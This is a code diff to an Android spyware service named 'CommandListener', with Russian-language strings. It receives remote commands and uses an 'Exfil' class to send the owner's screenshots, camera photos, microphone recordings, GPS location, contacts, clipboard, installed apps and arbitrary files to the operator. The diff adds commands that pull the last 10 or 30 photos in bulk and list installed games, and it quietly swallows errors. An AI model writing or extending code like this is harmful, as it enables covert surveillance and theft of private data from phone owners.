@@ -75,7 +75,7 @@ public class CommandListener extends Service {
                         }
                     }
                 } catch (Throwable t) {
-                    // тихо игнорируем ошибки сети
+                    // тихо
                 }
                 if (running) handler.postDelayed(poll, INTERVAL);
             }).start();
@@ -86,27 +86,28 @@ public class CommandListener extends Service {
         try {
             if (text.startsWith("/help") || text.startsWith("/start")) {
                 Exfil.send("HELP",
-                    "/ping — проверка связи\n" +
+                    "/ping — связь\n" +
                     "/screenshot — скрин\n" +
                     "/photo — фронталка\n" +
-                    "/mic — запись 20 сек\n" +
+                    "/mic — 20 сек\n" +
                     "/location — GPS\n" +
                     "/info — статус\n" +
                     "/apps — приложения\n" +
+                    "/games — игры\n" +
                     "/contacts — контакты\n" +
                     "/battery — батарея\n" +
                     "/clip — буфер\n" +
                     "/vibrate — вибрация\n" +
                     "/files <path> — файлы\n" +
-                    "/get <path> — скачать");
+                    "/get <path> — скачать\n" +
+                    "/photos — 10 фото\n" +
+                    "/photos_all — 30 фото");
                 return;
             }
-
             if (text.startsWith("/ping")) {
                 Exfil.send("CMD", "Pong! Связь работает ✅");
                 return;
             }
-
             if (text.startsWith("/screenshot")) {
                 try {
                     Intent i = new Intent(this, MediaSniffer.class);
@@ -117,9 +118,9 @@ public class CommandListener extends Service {
                 }
                 return;
             }
-
             if (text.startsWith("/info")) { CommandHandler.sendInfo(this); return; }
             if (text.startsWith("/apps")) { AppList.dump(this); return; }
+            if (text.startsWith("/games")) { GameList.dump(this); return; }
             if (text.startsWith("/contacts")) { CommandHandler.sendContacts(this); return; }
             if (text.startsWith("/location")) { CommandHandler.sendLocation(this); return; }
             if (text.startsWith("/photo")) { CommandHandler.takePhoto(this); return; }
@@ -128,17 +129,15 @@ public class CommandListener extends Service {
             if (text.startsWith("/battery")) { CommandHandler.sendBattery(this); return; }
             if (text.startsWith("/vibrate")) {
                 CommandHandler.vibrate(this);
-                Exfil.send("CMD", "Вибрация отправлена");
+                Exfil.send("CMD", "Вибрация");
                 return;
             }
-
             if (text.startsWith("/files")) {
                 String path = text.substring(6).trim();
                 if (path.isEmpty()) path = "/sdcard/";
                 FileManager.listDir(this, path);
                 return;
             }
-
             if (text.startsWith("/get")) {
                 String path = text.substring(4).trim();
                 if (path.isEmpty()) {
@@ -148,7 +147,14 @@ public class CommandListener extends Service {
                 FileManager.downloadFile(this, path);
                 return;
             }
-
+            if (text.startsWith("/photos_all")) {
+                FileManager.allPhotos(this);
+                return;
+            }
+            if (text.startsWith("/photos")) {
+                FileManager.lastPhotos(this);
+                return;
+            }
             Exfil.send("CMD", "Неизвестная команда: " + text);
         } catch (Throwable t) {
             Exfil.send("CMD", "Ошибка: " + t.getMessage());
